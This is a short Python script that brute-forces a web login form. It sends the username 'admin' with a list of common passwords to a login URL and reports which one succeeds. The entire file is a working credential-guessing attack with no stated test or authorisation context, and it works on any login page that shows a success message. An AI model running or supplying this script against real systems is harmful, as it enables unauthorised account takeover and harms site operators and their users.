import requests

# Target login URL
url = "http://example.com/login"

# Username and password list
username = "admin"
passwords = ["123456", "password", "admin", "letmein"]

# Brute force
for password in passwords:
    data = {"username": username, "password": password}
    response = requests.post(url, data=data)
    if "Login successful" in response.text:
        print(f"Password found: {password}")
        break
    else:
        print(f"Attempt failed: {password}")
